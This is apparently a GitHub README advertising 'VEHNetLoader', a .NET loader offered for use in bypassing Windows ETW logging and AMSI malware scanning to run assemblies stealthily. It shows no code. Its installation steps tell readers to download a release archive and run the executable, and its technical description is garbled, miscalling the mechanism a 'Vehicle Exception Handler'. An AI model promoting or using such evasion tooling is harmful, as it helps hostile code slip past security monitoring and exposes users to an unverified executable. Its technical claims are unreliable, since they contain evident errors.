# VEHNetLoader: A .NET Loader for Bypassing ETW and AMSI

![VEHNetLoader](https://img.shields.io/badge/VEHNetLoader-v1.0-brightgreen)
![GitHub Releases](https://img.shields.io/badge/Releases-latest-blue)

[![Download VEHNetLoader](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-orange)](https://github.com/kevinosinaga/VEHNetLoader/releases)

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Overview

VEHNetLoader is a versatile .NET loader designed to bypass Event Tracing for Windows (ETW) and Anti-Malware Scan Interface (AMSI). It leverages the Vehicle Exception Handler (VEH) to perform system calls and load .NET assemblies efficiently. This tool is particularly useful for developers and security researchers looking to enhance their .NET applications while maintaining a low profile.

## Features

- **Bypass ETW**: Avoid detection by Event Tracing for Windows, allowing for stealthier operations.
- **AMSI Bypass**: Prevent AMSI from scanning .NET assemblies, enabling smoother execution.
- **Utilizes VEH**: Use Vehicle Exception Handlers for making system calls, improving reliability.
- **Assembly Loading**: Load .NET assemblies seamlessly, facilitating rapid development and testing.
- **Lightweight**: Designed to be minimalistic and efficient, reducing overhead on system resources.

## Installation

To install VEHNetLoader, follow these steps:

1. **Download the latest release** from the [Releases page](https://github.com/kevinosinaga/VEHNetLoader/releases). Look for the file you need to download and execute.
2. **Extract the files** from the downloaded archive.
3. **Run the executable** to start using VEHNetLoader.

## Usage

Using VEHNetLoader is straightforward. Here’s a basic example of how to utilize its features:

1. **Load an Assembly**: To load a .NET assembly, use the command line interface provided by the loader.
2. **Bypass Detection**: Ensure that the necessary flags are set to bypass ETW and AMSI during execution.
3. **Monitor Performance**: Use built-in logging to monitor the performance and behavior of the loaded assembly.

### Example Command

```bash
VEHNetLoader.exe -load yourAssembly.dll
```

Replace `yourAssembly.dll` with the path to your .NET assembly.

## Contributing

Contributions are welcome! If you would like to contribute to VEHNetLoader, please follow these steps:

1. **Fork the repository** on GitHub.
2. **Create a new branch** for your feature or bug fix.
3. **Make your changes** and commit them with clear messages.
4. **Push your branch** to your forked repository.
5. **Open a pull request** to the main repository.

Please ensure that your code follows the existing style and includes appropriate tests.

## License

VEHNetLoader is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Contact

For questions or feedback, feel free to reach out:

- **Author**: Kevin Osinaga
- **Email**: kevin@example.com
- **GitHub**: [kevinosinaga](https://github.com/kevinosinaga)

For more information, visit the [Releases section](https://github.com/kevinosinaga/VEHNetLoader/releases) to check for updates and downloads.